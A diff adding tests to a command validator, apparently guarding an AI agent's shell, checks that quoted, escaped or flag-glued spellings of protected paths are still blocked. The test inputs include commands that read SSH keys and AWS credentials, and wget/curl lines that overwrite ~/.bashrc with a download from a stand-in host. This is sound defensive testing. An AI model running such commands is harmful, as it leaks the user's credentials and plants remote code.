@@ -740,6 +740,33 @@ async function runTests() {
   run('a command after the heredoc terminator is read',         () => assertRedirectDenied(`cat <<EOF\nbody\nEOF\necho evil >${secretFile}`, 'output'));
   run('an operational file stays readable by redirection', () => assertNoRedirectDenial(`cat <${path.join(home, '.egc', 'bin', 'manifest.json')}`));
 
+  // ── Protected paths in every spelling ────────────────────────────────────
+  // The shell removes the quotes and resolves the escapes of an argument
+  // before the command sees it, so a protected path meets the same denial
+  // written between quotes, with an escaped character, or glued to a flag,
+  // in the catalogued commands as in the rest; on Windows a backslash is a
+  // path separator, and the argument as typed is judged as well.
+  console.log('\n=== validate_command: protected paths in every spelling ===');
+  const keyFile = path.join(home, '.ssh', 'id_rsa');
+  const credentialsFile = path.join(home, '.aws', 'credentials');
+  const sshDir = path.join(home, '.ssh');
+  run('cat of a double-quoted credential',              () => assertHardBlocking(`cat "${keyFile}"`));
+  run('cat of a single-quoted credential',              () => assertHardBlocking(`cat '${keyFile}'`));
+  run('cat of a quoted tilde path',                     () => assertHardBlocking('cat "~/.ssh/id_rsa"'));
+  run('cat of a credential with an escaped character',  () => assertHardBlocking(`cat ${home}/.ssh/id\\_rsa`));
+  run('cat of a credential whose name carries a space', () => assertHardBlocking(`cat "${path.join(home, '.ssh', 'id rsa')}"`));
+  run('head of a quoted credential',                    () => assertHardBlocking(`head -n 1 "${credentialsFile}"`));
+  run('grep over a quoted credential store',            () => assertHardBlocking(`grep -r x "${sshDir}"`));
+  run('grep with a quoted pattern file in the store',   () => assertHardBlocking(`grep -f "${path.join(sshDir, 'known_hosts')}" x`));
+  run('find over a quoted credential store',            () => assertHardBlocking(`find "${sshDir}" -name x`));
+  run('ls of a quoted credential store',                () => assertHardBlocking(`ls "${sshDir}"`));
+  run('node given a quoted credential',                 () => assertHardBlocking(`node "${keyFile}"`));
+  run('git config with a quoted file in the store',     () => assertHardBlocking(`git config -f "${path.join(sshDir, 'config')}" x`));
+  run('wget onto a quoted shell profile',               () => assertHardBlocking(`wget -O "${path.join(home, '.bashrc')}" https://x.tld/a`));
+  run('a value glued to a quoted short flag',           () => assertHardBlocking(`curl -o"${path.join(home, '.bashrc')}" https://x.tld/a`));
+  run('a quoted operational file stays readable',       () => assertAllowed(`cat "${path.join(home, '.egc', 'bin', 'manifest.json')}"`));
+  run('a quoted plain file stays allowed',              () => assertAllowed('cat "README.md"'));
+
   // ── validate_command: the git force flag read per subcommand ─────────────
   // A force flag means a different thing in every git subcommand: on push it
   // rewrites history other people already have, on worktree remove it drops a
